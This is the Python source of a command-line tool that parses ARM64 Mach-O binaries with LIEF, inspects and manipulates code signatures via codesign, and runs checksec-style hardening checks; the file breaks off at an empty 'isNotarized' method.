#!/usr/bin/env python3
import lief
import uuid
import argparse
import subprocess
import os
import sys
import mmap
import plistlib
import json
import sys
import treelib
import ctypes

### --- I. MACH-O --- ###
class MachOProcessor:
    def __init__(self, file_path):
        '''This class contains part of the code from the main() for the SnakeI: Mach-O part.'''
        self.file_path = os.path.abspath(file_path)

    def parseFatBinary(self):
        '''Return Fat Binary object.'''
        return lief.MachO.parse(self.file_path)

    def process(self, args):
        '''Executes the code for the SnakeI: Mach-O.'''
        if not os.path.exists(self.file_path): # Check if file_path specified in the --path argument exists.
            print(f'The file {self.file_path} does not exist.')
            exit()

        global binaries # It must be global, becuase after the MachOProcessor object is destructed, the snake_instance would point to invalid memory ("binary" is dependant on "binaries").
        global snake_instance # Must be global for further processors classes.
        
        binaries = self.parseFatBinary()

        if binaries == None:
            exit() # Exit if not

        snake_instance = SnakeVI(binaries, self.file_path) # Initialize the latest Snake class

        if args.file_type: # Print binary file type
            print(f'File type: {snake_instance.getFileType()}')

        if args.header_flags: # Print binary header flags
            header_flag_list = snake_instance.getHeaderFlags()
            print("Header flags:", " ".join(header_flag.name for header_flag in header_flag_list))

        if args.endian: # Print binary endianess
            print(f'Endianess: {snake_instance.getEndianess()}')

        if args.header: # Print binary header
            print(snake_instance.getBinaryHeader())

        if args.load_commands: # Print binary load commands
            load_commands_list = snake_instance.getLoadCommands()
            print("Load Commands:", " ".join(load_command.command.name for load_command in load_commands_list))

        if args.has_cmd: # Check if LC exist
            snake_instance.printHasLoadCommand(args.has_cmd)
            
        if args.segments: # Print binary segments in human friendly form
            for segment in snake_instance.getSegments():
                print(segment)

        if args.has_segment: # Check if binary has given __SEGMENT
            snake_instance.printHasSegment(args.has_segment)
        
        if args.sections: # Print binary sections in human friendly form
            for section in snake_instance.getSections():
                print(section)
        
        if args.has_section: # Check if binary has given __SEGMENT,__section
            snake_instance.printHasSection(args.has_section)

        if args.symbols: # Print symbols
            for symbol in snake_instance.getSymbols():
                print(f"0x{symbol.value:016X} {symbol.name}")

        if args.imports: # Print imported symbols
            snake_instance.printImports()

        if args.exports: # Print exported symbols
            snake_instance.printExports()

        if args.imported_symbols:
            snake_instance.printImportedSymbols()

        if args.chained_fixups: # Print Chained Fixups information
            print(snake_instance.getChainedFixups())

        if args.exports_trie: # Print Exports Trie information 
            print(snake_instance.getExportTrie())    

        if args.uuid: # Print UUID
            print(f'UUID: {snake_instance.getUUID()}')

        if args.main: # Print entry point and stack size
            snake_instance.printMain()

        if args.encryption_info is not None: # Print encryption info and save encrypted data if path is specified
            snake_instance.printEncryptionInfo(args.encryption_info)

        if args.strings_section: # Print strings from __cstring section
            print('Strings from __cstring section:')
            print('-------------------------------')
            for string in (snake_instance.getStringSection()):
                print(string)

        if args.all_strings: # Print strings from all sections.
            print(snake_instance.findAllStringsInBinary())

        if args.save_strings: # Parse all sections, detect strings and save them to a file
            extracted_strings = snake_instance.findAllStringsInBinary()
            with open(args.save_strings, 'a') as f:
                for s in extracted_strings:
                    f.write(s)

        if args.info: # Print all info about the binary
            print('\n<=== HEADER ===>')
            print(snake_instance.getBinaryHeader())
            print('\n<=== LOAD COMMANDS ===>')
            for lcd in snake_instance.getLoadCommands():
                print(lcd)
                print("="*50)
            print('\n<=== SEGMENTS ===>')
            for segment in snake_instance.getSegments():
                print(segment)
            print('\n<=== SECTIONS ===>')
            for section in snake_instance.getSections():
                print(section)
            print('\n<=== SYMBOLS  ===>')
            for symbol in snake_instance.getSymbols():
                print(f"{(symbol.name).ljust(32)} {hex(symbol.value)}")
            print('\n<=== STRINGS ===>')
            print('Strings from __cstring section:')
            print('-------------------------------')
            for string in (snake_instance.getStringSection()):
                print(string)
            if snake_instance.binary.has_encryption_info:
                print('\n<=== ENCRYPTION INFO ===>')
                snake_instance.printEncryptionInfo()
            print('\n<=== UUID ===>')
            print(f'{snake_instance.getUUID()}')
            print('\n<=== ENDIANESS ===>')
            print(snake_instance.getEndianess())
            print('\n<=== ENTRYPOINT ===>')
            snake_instance.printMain()

        if args.dump_data: # Dump {size} bytes starting from {offset} to a given {filename}.
            snake_instance.dumpDataArgParser(args.dump_data)

        if args.calc_offset: # Calculate the real address of the Virtual Memory in the file.
            snake_instance.printCalcRealAddressFromVM(args.calc_offset)

class SnakeI:
    def __init__(self, binaries, file_path):
        '''
            When initiated, the program parses a Universal binary (binaries parameter) and extracts the ARM64 Mach-O. 
            If the file is not in a universal format but is a valid ARM64 Mach-O, it is taken as a binary parameter during initialization.
        '''
        self.binary = self.parseFatBinary(binaries)
        self.file_path = file_path
        self.load_commands = self.getLoadCommands()
        self.endianess = self.getEndianess()
        self.fat_offset = self.binary.fat_offset # For various calculations, if ARM64 Mach-O extracted from Universal Binary 
        self.prot_map = {
        0: '---',
        1: 'r--',
        2: '-w-',
        3: 'rw-',
        4: '--x',
        5: 'r-x',
        6: '-wx',
        7: 'rwx'
        }
        self.segment_flags_map = {
        0x1: 'SG_HIGHVM',
        0x2: 'SG_FVMLIB',
        0x4: 'SG_NORELOC',
        0x8: 'SG_PROTECTED_VERSION_1',
        0x10: 'SG_READ_ONLY',
        }
        self.symbol_types = {
            'N_STAB': 0xE0,  # DEBUG SYMBOL
            'N_PEXT': 0x10,  # PRIVATE EXTERNAL SYMBOL
            'N_TYPE': 0x0E,  # CHECK N_TYPES
            'N_EXT' : 0x01,  # EXTERNAL SYMBOL
            'N_TYPES': {
                'N_UNDF': 0x00, # UNDEFINED
                'N_ABS':  0x02, # ABSOLUTE
                'N_SECT': 0x0E, # DEFINED IN SECTION
                'N_PBUD': 0x0C, # PREBOUND UNDEFINED (in dylib)
                'N_INDR': 0x0A, # INDIRECT
            }
        }

    def mapProtection(self, numeric_protection):
        '''Maps numeric protection to its string representation.'''
        return self.prot_map.get(numeric_protection, 'Unknown')

    def getSegmentFlags(self, flags):
        '''Maps numeric segment flags to its string representation.'''
        return self.segment_flags_map.get(flags, '')
        #return " ".join(activated_flags)

    def parseFatBinary(self, binaries):
        '''
            Parse Mach-O file, whether compiled for multiple architectures or just for a single one. 
            It returns the ARM64 binary if it exists. 
            If not, it exits the program.
        '''
        for binary in binaries:
            if binary.header.cpu_type == lief.MachO.CPU_TYPES.ARM64:
                arm64_bin = binary
        if arm64_bin == None:
            print('The specified Mach-O file is not in ARM64 architecture.')
            exit()
        return arm64_bin

    def getFileType(self):
        '''Extract and return the file type from a binary object's header.'''
        return self.binary.header.file_type.name

    def getHeaderFlags(self):
        '''Return binary header flags.'''
        return self.binary.header.flags_list

    def getEndianess(self):
        '''Check the endianness of a binary based on the system and binary's magic number.'''
        magic = self.binary.header.magic.name
        endianness = sys.byteorder
        if endianness == 'little' and (magic == 'MAGIC_64' or magic == 'MAGIC' or magic == 'FAT_MAGIC'):
            return 'little'
        else:
            return 'big'

    def getBinaryHeader(self):
        '''https://lief-project.github.io/doc/stable/api/python/macho.html#header'''
        return self.binary.header

    def getLoadCommands(self):
        '''https://lief-project.github.io/doc/stable/api/python/macho.html#loadcommand'''
        return self.binary.commands

    def getSegment(self, segment_name):
        ''' Return segment object for the given {segment_name} __SEGMENT. '''
        segment_name = segment_name.lower()
        
        for segment in self.binary.segments:
            if (segment.name).lower() == segment_name:
                return segment
        return None

    def getSegments(self):
        '''Extract segmenents from binary and return a human readable string: https://lief-project.github.io/doc/stable/api/python/macho.html#lief.MachO.SegmentCommand'''
        segment_info = []
        for segment in self.binary.segments:
            name = segment.name
            va_start = '0x' + format(segment.virtual_address, '016x')
            va_end = '0x' + format(int(va_start, 16) + segment.virtual_size, '016x')
            file_start = hex(segment.file_size + self.fat_offset)
            file_end = hex(int(file_start, 16) + segment.file_size)
            init_prot = self.mapProtection(segment.init_protection)
            max_prot = self.mapProtection(segment.max_protection)            
            flags = self.getSegmentFlags(segment.flags)
            if flags != '':
                segment_info.append(f'{name.ljust(16)}{init_prot}/{max_prot.ljust(8)} VM: {va_start}-{va_end.ljust(24)} FILE: {file_start}-{file_end} ({flags})')
            else:
                segment_info.append(f'{name.ljust(16)}{init_prot}/{max_prot.ljust(8)} VM: {va_start}-{va_end.ljust(24)} FILE: {file_start}-{file_end}')                
        return segment_info

    def hasSegment(self, segment_name):
        ''' Check if binary has given segment {segment_name}. '''
        for segment in self.binary.segments:
            if segment.name == segment_name:
                return True
        return False

    def printHasSegment(self, segment_name):
        ''' Printing function for --has_segment. '''
        if self.hasSegment(segment_name):
            print(f'{self.file_path} has {segment_name}')
    
    def calcSectionRange(self, section):
        '''
            The function calculates a section's start and end offset by adding the FAT slide in case of fat binary.
            
                Arg section is iterator object from the self.binary.sections (for section in self.binary.sections)
                Return the start and end offset of the section.
        '''
        start = section.offset + self.fat_offset
        end = section.size + section.offset + self.fat_offset
        return start, end

    def getSectionRange(self, segment_name, section_name):
        '''
            Return section start and end file offset. 
            If there is no such section return False, False.
        '''
        for section in self.binary.sections:
            if segment_name == section.segment_name:
                if section_name == section.fullname:
                    section_offset_start, section_offset_end = self.calcSectionRange(section)
                    return section_offset_start, section_offset_end
        return False, False

    def getSection(self, segment_section):
        ''' Return segment object for the given {segment_section} __SEGMENT,__section. '''
        segment_section = segment_section.lower()

        for section in self.binary.sections:
            current_segment_section = f'{section.segment_name},{section.name}'.lower()

            if current_segment_section == segment_section:
                return section

        return None

    def getSections(self):
        '''Extract sections from binary and return in human readable format: https://lief-project.github.io/doc/stable/api/python/macho.html#lief.MachO.Section'''
        sections_info = []
        sections_info.append("SEGMENT".ljust(14) + "SECTION".ljust(20) + "TYPE".ljust(28) + "VIRTUAL MEMORY".ljust(32) + "FILE".ljust(26) + "FLAGS".ljust(40))
        sections_info.append(len(sections_info[0])*"=")
        for section in self.binary.sections:
            segment_name = section.segment_name
            section_name = section.fullname
            section_type = section.type.name
            section_va_start = hex(section.virtual_address)
            section_va_end = hex(section.virtual_address + section.offset)
            section_size_start, section_size_end = self.calcSectionRange(section)
            section_size_start = hex(section_size_start)
            section_size_end = hex(section_size_end)
            section_flags_list = section.flags_list
            flags_strings = [flag.name for flag in section_flags_list]
            flags = " ".join(flags_strings)
            sections_info.append((f'{segment_name.ljust(14)}{section_name.ljust(20)}{section_type.ljust(28)}{section_va_start}-{section_va_end.ljust(20)}{section_size_start}-{section_size_end}\t\t({flags})'))
        return sections_info

    def getSymbols(self):
        '''Get all symbols from the binary (LC_SYMTAB, Chained Fixups, Exports Trie): https://lief-project.github.io/doc/stable/api/python/macho.html#symbol'''
        return self.binary.symbols

    def getImports(self):
        ''' Imported symbols are undefined and external. '''
        imported_symbols = []

        for symbol in self.getSymbols():
            if (symbol.type & self.symbol_types['N_EXT']):
                if (symbol.type & self.symbol_types['N_TYPE']) == self.symbol_types['N_TYPES']['N_UNDF']:
                    imported_symbols.append(symbol)

        return(imported_symbols)

    def printImports(self):
        ''' Printing only imported symbol names. '''
        for symbol in self.getImports():
            print(symbol.name)

    def getExports(self):
        ''' Exported symbols are external but not undefined or private. '''
        exported_symbols = []

        for symbol in self.getSymbols():
            if (symbol.type & self.symbol_types['N_EXT']):
                if (symbol.type & self.symbol_types['N_TYPE']) != self.symbol_types['N_TYPES']['N_UNDF']:
                    exported_symbols.append(symbol)

        return(exported_symbols)

    def printExports(self):
        ''' Printing only exported symbol names. '''
        for symbol in self.getExports():
            print(symbol.name)
        
    def getChainedFixups(self):
        '''Return Chained Fixups information: https://lief-project.github.io/doc/latest/api/python/macho.html#chained-binding-info'''
        return self.binary.dyld_chained_fixups

    def getExportTrie(self):
        '''Return Export Trie information: https://lief-project.github.io/doc/latest/api/python/macho.html#dyldexportstrie-command'''
        try:
            return self.binary.dyld_exports_trie.show_export_trie()
        except:
            return "NO EXPORT TRIE"

    def getUUID(self):
        '''Return UUID as string and in UUID format: https://lief-project.github.io/doc/stable/api/python/macho.html#uuidcommand'''
        for cmd in self.binary.commands:
            if isinstance(cmd, lief.MachO.UUIDCommand):
                uuid_bytes = cmd.uuid
                break
        uuid_string = str(uuid.UUID(bytes=bytes(uuid_bytes)))
        return uuid_string

    def getMain(self):
        '''Determine the entry point of an executable (LC_MAIN or LC_THREAD or LC_UNIXTHREAD)'''
        LC_MAIN = self.binary.main_command

        if LC_MAIN:
            return LC_MAIN

        LC_UNIXTHREAD = self.binary.thread_command
        return LC_UNIXTHREAD

    def printMain(self):
        '''Prints entry point and stack size or Thread flavor if exists.'''
        entry_point = self.getMain()

        if entry_point and hasattr(entry_point, 'entrypoint'):
            print(f'Entry point: {hex(entry_point.entrypoint)}')
            print(f'Stack size: {hex(entry_point.stack_size)}')

        elif entry_point and hasattr(entry_point, 'pc'):
            print(f'Entry point (PC): {hex(entry_point.pc)}')
            print(f'Thread flavor: {hex(entry_point.flavor)}')

        else:
            print(f"{self.file_path} has no entry point (LC_MAIN or LC_THREAD or LC_UNIXTHREAD).")

    def getStringSection(self):
        '''Return strings from the __cstring (string table).'''
        extracted_strings = set()
        for section in self.binary.sections:
            if section.type == lief.MachO.SECTION_TYPES.CSTRING_LITERALS:
                strings_bytes = section.content.tobytes()
                strings = strings_bytes.decode('utf-8', errors='ignore')  # Adjust the encoding as per your requirements
                extracted_strings.update(strings.split('\x00'))
        return extracted_strings

    def findAllStringsInBinary(self):
        '''Check every binary section to find strings.'''
        extracted_strings = ""
        byte_set = set()
        for section in self.binary.sections:
            byte_set.update(section.content.tobytes().split(b'\x00'))
        for byte_item in byte_set:
            try:
                decoded_string = byte_item.decode('utf-8')
                extracted_strings += decoded_string + "\n"
            except UnicodeDecodeError:
                pass
        return extracted_strings

    def getEncryptionInfo(self):
        '''Return information regardles to LC_ENCRYPTION_INFO(_64).'''
        if self.binary.has_encryption_info:
            crypt_id = self.binary.encryption_info.crypt_id
            crypt_offset = self.binary.encryption_info.crypt_offset
            crypt_size = self.binary.encryption_info.crypt_size
            return crypt_id, crypt_offset, crypt_size
        else:
            return None

    def printEncryptionInfo(self, save_path=''):
        '''
            Pretty prints Encryption Info data if it exists.
            If save_path argument is specified, save the encrypted data there.
            If the cryptid is 0, the data is unencrypted.
        '''
        encryption_info = self.getEncryptionInfo()
        if encryption_info:
            crypt_id, crypt_offset, crypt_size = encryption_info
            print(f"cryptid: {crypt_id}")
            print(f"cryptoffset: {hex(crypt_offset)}")
            print(f"cryptsize: {hex(crypt_size)}")
            if save_path: # args.encryption_info
                self.saveEcryptedData(save_path.strip())
        else:
            print(f"{os.path.basename(self.file_path)} binary does not have encryption info.")

    def extractBytesAtOffset(self, offset, size):
        '''Extract bytes at a given offset and of a specified size in a binary file'''
        # Open the binary file in binary mode
        with open(self.file_path, "rb") as file:
            # Check if the specified offset and size are within bounds
            file_size = os.path.getsize(self.file_path)
            #offset += self.fat_offset # Add the fat_offset in case of the Fat Binary (ARM binary data is most of the time after x86_64 binary data)
            #print(hex(offset) + hex(size))
            if offset + size > file_size:
                raise ValueError("Offset and size exceed the binary file's length.")
            # Seek to the offset considering the fat_offset
            file.seek(offset)
            # Read the specified size of bytes
            extracted_bytes = file.read(size)
        return extracted_bytes

    def saveBytesToFile(self, data, filename):
        ''' Save bytes to a file. '''
        with open(filename, 'wb') as file:
            file.write(data)

    def readBytesFromFile(self, filename):
        ''' Read bytes from a file. '''
        with open(filename, 'rb') as file:
            data = file.read()

        return data

    def dumpData(self, offset, size, filename):
        ''' Extract {size} bytes starting from {offset} to a given {filename}. '''
        extracted_bytes = self.extractBytesAtOffset(offset, size)
        
        if extracted_bytes:
            self.saveBytesToFile(extracted_bytes, filename)

    def dumpDataArgParser(self, args):
        ''' Parse comma separated values for dumpData from --dump_data 'offset,size,filename'. '''
        offset, size, filename = args.split(',')

        offset = offset.strip().lower()
        if offset.startswith("0x"):
            offset = int(offset, 16)

        size = size.strip().lower()
        if size.startswith("0x"):
            size = int(size, 16)

        filename = filename.strip()

        self.dumpData(offset, size, filename)

    def saveEcryptedData(self, output_path):
        '''Method for saving encrypted data sector to specified file.'''
        _, cryptoff, cryptsize = self.getEncryptionInfo()
        self.saveBytesToFile(self.extractBytesAtOffset(cryptoff + self.fat_offset, cryptsize), output_path)

    def hasSection(self, segment_section):
        ''' 
            Takes "__SEGMENT,__section" as an input.
            Return True if it exists.
        '''
        segment_section = segment_section.lower()

        for section in self.binary.sections:
            current_segment_section = f'{section.segment_name},{section.name}'.lower()

            if current_segment_section == segment_section:
                return True

        return False

    def printHasSection(self, segment_section):
        ''' Printing function for --has_section. '''
        if self.hasSection(segment_section):
            print(f'{self.file_path} has {segment_section}')

    def extractSection(self, segment_name, section_name):
        '''
            As argument takes segment name (e.g. "__PRELINK_INFO") and section name that is a part of the segment (e.g. '__text').
            Return data (bytes) stored in a given section.
            If section was not found or is empty -> return False.
        '''
        segment_section = f'{segment_name},{section_name}' 

        if not self.hasSection(segment_section): # If section was not found, break.
            return False

        section_offset_start, section_offset_end = self.getSectionRange(segment_name, section_name)

        if section_offset_start and section_offset_end:
            size = section_offset_end - section_offset_start
            extracted_bytes = self.extractBytesAtOffset(section_offset_start, size)
            return extracted_bytes
        return False

    def dumpSection(self, segment_name, section_name, filename):
        '''
            Dump '__SEGMENT,__section' to a given file.
                Reutrn False if the section does not exist.
        '''
        extracted_bytes = self.extractSection(segment_name, section_name)
        if extracted_bytes:
            self.saveBytesToFile(extracted_bytes, filename)
            return True
        return False

    def hasLoadCommand(self, load_command):
        ''' Check if the given Load Command exists in the binary. '''
        if load_command.startswith("LC_"):
            load_command = load_command[3:]
        load_command = load_command.lower()

        for cmd in self.load_commands:
            cmd = str(cmd.command.name).lower()
            if load_command == cmd:
                return True
        return False

    def printHasLoadCommand(self, load_command):
        ''' Printing function for has_cmd. '''
        original_user_input = load_command
        if self.hasLoadCommand(load_command):
            print(f'{self.file_path} has {original_user_input}')

    def getVirtualMemoryStartingAddress(self):
        ''' Get start VM base addr of the __TEXT segment '''
        vm_base = 0
        if self.hasSegment('__TEXT'):
            for segment in self.binary.segments:
                if segment.name == '__TEXT':
                    vm_base = segment.virtual_address + self.fat_offset
        return vm_base

    def calcRealAddressFromVM(self, vm_offset):
        ''' 
            Calculate the real address of the Virtual Memory in the file.
                vm_start == __TEXT segment
                vm_offset == your address
                real = vm_offset - vm_start
        '''
        # Handling strings and hexes
        if type(vm_offset) is not int:
            if (vm_offset.lower()).startswith("0x"):
                vm_offset = int(vm_offset, 16)
            else:
                vm_offset = int(vm_offset)

        vm_base = self.getVirtualMemoryStartingAddress()
        vm_offset = vm_offset - vm_base
        return vm_offset

    def printCalcRealAddressFromVM(self, vm_offset):
        ''' Printing function for --calc_offset '''
        real_offset = self.calcRealAddressFromVM(vm_offset)
        real_offset_hex = hex(real_offset)
        print(f'{vm_offset} : {real_offset_hex}')

### --- II. CODE SIGNING --- ### 
class CodeSigningProcessor:
    def __init__(self):
        '''This class contains part of the code from the main() for the SnakeII: Code Signing.'''
        pass

    def process(self, args):
        if args.verify_signature: # Verify if Code Signature match the binary content ()
            if snake_instance.isSigValid(snake_instance.file_path):
                print("Valid Code Signature (matches the content)")
            else:
                print("Invalid Code Signature (does not match the content)")

        if args.cd_info: # Print Code Signature information
            print(snake_instance.getCodeSignature(snake_instance.file_path).decode('utf-8'))

        if args.cd_requirements: # Print Requirements.
            print(snake_instance.getCodeSignatureRequirements(snake_instance.file_path).decode('utf-8'))

        if args.entitlements: # Print Entitlements.
            print(snake_instance.getEntitlementsFromCodeSignature(snake_instance.file_path, args.entitlements))

        if args.extract_cms: # Extract the CMS Signature and save it to a given file.
            cms_signature = snake_instance.extractCMS()
            snake_instance.saveBytesToFile(cms_signature, args.extract_cms)

        if args.extract_certificates: # Extract Certificates and save them to a given file.
            snake_instance.extractCertificatesFromCodeSignature(args.extract_certificates)

        if args.remove_sig: # Save a new file on a disk with the removed signature:
            snake_instance.removeCodeSignature(args.remove_sig)

        if args.sign_binary: # Sign the given binary using specified identity:
            snake_instance.signBinary(args.sign_binary)

class SnakeII(SnakeI):
    def __init__(self, binaries, file_path):
        super().__init__(binaries, file_path)
        self.magic_bytes = (0xFADE0B01).to_bytes(4, byteorder='big')  # CMS Signature Blob magic bytes, as Code Signature as a whole is in network byte order(big endian).

    def isSigValid(self, file_path):
        '''Checks if the Code Signature is valid (if the contents of the binary have been modified.)'''
        result = subprocess.run(["codesign", "-v", file_path], capture_output=True)
        if result.stderr == b'':
            return True
        else:
            return False

    def getCodeSignature(self, file_path):
        '''Returns information about the Code Signature.'''
        result = subprocess.run(["codesign", "-d", "-vvvvvv", file_path], capture_output=True)
        return result.stderr

    def getCodeSignatureRequirements(self, file_path):
        '''Returns information about the Code Signature Requirements.'''
        result = subprocess.run(["codesign", "-d", "-r", "-", file_path], capture_output=True)
        return result.stdout

    def getEntitlementsFromCodeSignature(self, file_path, format=None):
        '''Returns information about the Entitlements for Code Signature.'''
        if format == 'human' or format == None:
            result = subprocess.run(["codesign", "-d", "--entitlements", "-", file_path], capture_output=True)
            return result.stdout.decode('utf-8')
        elif format == 'xml':
            result = subprocess.run(["codesign", "-d", "--entitlements", "-", "--xml", file_path], capture_output=True)
        elif format == 'der':
            result = subprocess.run(["codesign", "-d", "--entitlements", "-", "--der", file_path], capture_output=True)
        return result.stdout

    def extractCMS(self):
        '''Find the offset of magic bytes in a binary using LIEF.'''
        cs = self.binary.code_signature
        cs_content = bytes(cs.content)
        offset = cs_content.find(self.magic_bytes)
        cms_len_in_bytes = cs_content[offset + 4:offset + 8]
        cms_len_in_int = int.from_bytes(cms_len_in_bytes, byteorder='big')
        cms_signature = cs_content[offset + 8:offset + 8 + cms_len_in_int]
        return cms_signature

    def extractCertificatesFromCodeSignature(self, cert_name):
        '''Extracts certificates from the CMS Signature and saves them to a file with _0, _1, _2 indexes at the end of the file names.'''
        subprocess.run(["codesign", "-d", f"--extract-certificates={cert_name}_", self.file_path], capture_output=True)

    def removeCodeSignature(self, new_name):
        '''Save new file on a disk with removed signature.'''
        self.binary.remove_signature()
        self.binary.write(new_name)

    def signBinary(self, security_identity=None):
        '''Sign binary using pseudo identity (adhoc) or specified identity.'''
        if security_identity == 'adhoc' or security_identity == None:
            result = subprocess.run(["codesign", "-s", "-", "-f", self.file_path], capture_output=True)
            return result.stdout.decode('utf-8')
        else:
            try:
                result = subprocess.run(["codesign", "-s", security_identity, "-f", self.file_path], capture_output=True)
            except Exception as e:
                print(f"An error occurred during Code Signing using {security_identity}\n {e}")

### --- III. CHECKSEC --- ###
class ChecksecProcessor:
    def __init__(self):
        '''This class contains part of the code from the main() for the SnakeIII: Checksec.'''
        pass

    def process(self, args):
        if args.has_pie: # Check if PIE is set in the header flags
            print("PIE: " + str(snake_instance.hasPIE()))

        if args.has_arc: # Check if ARC is in use
            print("ARC: " + str(snake_instance.hasARC()))

        if args.is_stripped: # Check if binary is stripped
            print("STRIPPED: " + str(snake_instance.isStripped()))

        if args.has_canary: # Check if binary has stack canary
            print("CANARY: " + str(snake_instance.hasCanary()))

        if args.has_nx_stack: # Check if binary has non executable stack
            print("NX STACK: " + str(snake_instance.hasNXstack()))

        if args.has_nx_heap: # Check if binary has non executable heap
            print("NX HEAP: " + str(snake_instance.hasNXheap()))

        if args.has_xn: # Check if binary is protected by eXecute Never functionality
            print(f"eXecute Never: {str(snake_instance.hasXN())}")

        if args.is_notarized: # Check if the application is notarized and can pass the Gatekeeper verification
            print("NOTARIZED: " + str(snake_instance.isNotarized(snake_instance.file_path)))

        if args.is_encrypted: # Check if the application has encrypted data
            print("ENCRYPTED: " + str(snake_instance.isEncrypted()))

        if args.is_restricted: # Check if the application has encrypted data
            print("RESTRICTED: " + str(snake_instance.isRestricted(snake_instance.file_path)))

        if args.is_hr: # Check if Hardened Runtime is in use   
            print("HARDENED: " + str(snake_instance.hasHardenedRuntimeFlag(snake_instance.file_path)))

        if args.is_as: # Check if App Sandbox is in use
            print("APP SANDBOX: " + str(snake_instance.hasAppSandbox(snake_instance.file_path)))

        if args.is_fort: # Check if binary is fortified
            fortified_symbols = snake_instance.getForifiedSymbols()
            print("FORTIFIED: " + str(snake_instance.isFortified(fortified_symbols)))   

        if args.has_rpath: # Check if binary has @rpaths
            print("RPATH: " + str(snake_instance.hasRpath()))                

        if args.has_lv: # Check if binary is protected against Dylib Hijacking
            print("LIBRARY VALIDATION: " + str(snake_instance.checkDylibHijackingProtections(snake_instance.file_path)))

        if args.checksec: # Run all checks from above and present it in a table
            print("<==== CHECKSEC ======")
            print("PIE: ".ljust(16) + str(snake_instance.hasPIE()))
            print("ARC: ".ljust(16) + str(snake_instance.hasARC()))
            print("STRIPPED: ".ljust(16) + str(snake_instance.isStripped()))
            print("CANARY: ".ljust(16) + str(snake_instance.hasCanary()))
            print("NX STACK: ".ljust(16) + str(snake_instance.hasNXstack()))
            print("NX HEAP: ".ljust(16) + str(snake_instance.hasNXheap()))
            print("XN:".ljust(16) + str(snake_instance.hasXN()))
            print("NOTARIZED: ".ljust(16) + str(snake_instance.isNotarized(snake_instance.file_path)))
            print("ENCRYPTED: ".ljust(16) + str(snake_instance.isEncrypted()))
            print("RESTRICTED: ".ljust(16) + str(snake_instance.isRestricted(snake_instance.file_path)))
            print("HARDENED: ".ljust(16) + str(snake_instance.hasHardenedRuntimeFlag(snake_instance.file_path)))
            print("APP SANDBOX: ".ljust(16) + str(snake_instance.hasAppSandbox(snake_instance.file_path)))
            fortified_symbols = snake_instance.getForifiedSymbols()
            print("FORTIFIED: ".ljust(16) + str(snake_instance.isFortified(fortified_symbols)))
            print("RPATH: ".ljust(16) + str(snake_instance.hasRpath()))
            print("LV: ".ljust(16) + str(snake_instance.checkDylibHijackingProtections(snake_instance.file_path)))
            print("=====================>")

class SnakeIII(SnakeII):
    def __init__(self, binaries, file_path):
        super().__init__(binaries, file_path)

    def hasPIE(self):
        '''Check if MH_PIE (0x00200000) is set in the header flags.'''
        return self.binary.is_pie

    def hasARC(self):
        '''Check if the _objc_release symbol is imported.'''
        for symbol in self.binary.symbols:
            if symbol.name.lower().strip() == '_objc_release':
                return True
        return False

    def isStripped(self):
        '''Check if binary is stripped.'''
        filter_symbols = ['radr://5614542', '__mh_execute_header']

        for symbol in self.binary.symbols:
            symbol_type = symbol.type
            symbol_name = symbol.name.lower().strip()

            is_symbol_stripped = (symbol_type & 0xe0 > 0) or (symbol_type in [0x0e, 0x1e, 0x0f])
            is_filtered = symbol_name not in filter_symbols

            if is_symbol_stripped and is_filtered:
                return False
        return True

    def hasCanary(self):
        '''Check whether in the binary there are symbols: ___stack_chk_fail and ___stack_chk_guard.'''
        canary_symbols = ['___stack_chk_fail', '___stack_chk_guard']
        for symbol in self.binary.symbols:
            if symbol.name.lower().strip() in canary_symbols:
                return True
        return False

    def hasNXstack(self):
        '''Check if MH_ALLOW_STACK_EXECUTION (0x00020000 ) is not set in the header flags.'''
        return not bool(self.binary.header.flags & lief.MachO.HEADER_FLAGS.ALLOW_STACK_EXECUTION.value)

    def hasNXheap(self):
        '''Check if MH_NO_HEAP_EXECUTION (0x01000000 ) is set in the header flags.'''
        return bool(self.binary.header.flags & lief.MachO.HEADER_FLAGS.NO_HEAP_EXECUTION.value)

    def isXNos():
        '''Check if the OS is running on the ARM architecture.'''
        system_info = os.uname()
        if "arm" in system_info.machine.lower():
            return True
        return False

    def checkXNmap():
        '''If XN is ON, you will not be able to map memory page that has W&X at the same time, so to check it, you can create such page.'''
        try:
            mmap.mmap(-1,4096, prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)
        except mmap.error as e:
            #print(f"Failed to create W&X memory map - eXecute Never is supported on this machine. \n {str(e)}")
            return True
        return False

    def convertXMLEntitlementsToDict(self, entitlements_xml):
        '''Takes the Entitlements in XML format from getEntitlementsFromCodeSignature() method and convert them to a dictionary.'''
        return plistlib.loads(entitlements_xml)

    def convertDictEntitlementsToJson(self,entitlements_dict):
        '''Takes the Entitlements in dictionary format from convertXMLEntitlementsToDict() method and convert them to a JSON with indent 4.'''
        return json.dumps(entitlements_dict, indent=4)

    def checkIfEntitlementIsUsed(self, entitlement_name, entitlement_value, file_path):
        '''Check if the given entitlement exists and has the specified value.'''
        try:
            entitlements_xml = self.getEntitlementsFromCodeSignature(file_path, 'xml')
            if entitlements_xml == b'': # Return False if there are no entitlements
                return False
            entitlements_dict = self.convertXMLEntitlementsToDict(entitlements_xml)
            # Convert the entire parsed data to lowercase for case-insensitive comparison
            parsed_data = {key.lower(): value for key, value in entitlements_dict.items()}
            # Convert entitlement name and value to lowercase for case-insensitive and type-insensitive comparison
            entitlement_name_lower = entitlement_name.lower()
            entitlement_value_lower = str(entitlement_value).lower()

            if entitlement_name_lower in parsed_data and str(parsed_data[entitlement_name_lower]).lower() == entitlement_value_lower:
                return True
            else:
                return False
        except json.JSONDecodeError as e:
            # Handle JSON decoding error if any
            print(f"Error in checkIfEntitlementIsUsed: {e}")
            return False

    def hasAllowJITentitlement(self, file_path):
        '''Checks if the binary has missing com.apple.security.cs.allow-jit entitlement that allows the app to create writable and executable memory using the MAP_JIT flag.'''
        if self.checkIfEntitlementIsUsed('com.apple.security.cs.allow-jit', 'true', file_path):
            print(f"[INFO -> XN]: {os.path.basename(file_path)} contains allow-jit entitlement.")
            return True
        return False

    def checkIfCompiledForOtherThanARM(self):
        '''Iterates over FatBinary and check if there are other architectures than ARM.'''
        XN_types = [lief.MachO.CPU_TYPES.ARM64, lief.MachO.CPU_TYPES.ARM]
        for binary in binaries:
            if binary.header.cpu_type not in XN_types:
                print(f"[INFO -> XN]: {os.path.basename(file_path)} is compiled for other CPUs than ARM or ARM64.")
                return True
        return False

    def hasXN(self):
        '''Check if binary allows W&X via com.apple.security.cs.allow-jit entitlement or is compiled for other CPU types than these which supports eXecuteNever feature of ARM.'''
        if self.hasAllowJITentitlement(self.file_path) or self.checkIfCompiledForOtherThanARM():
            return False
        return True

    def isNotarized(self, file_path):
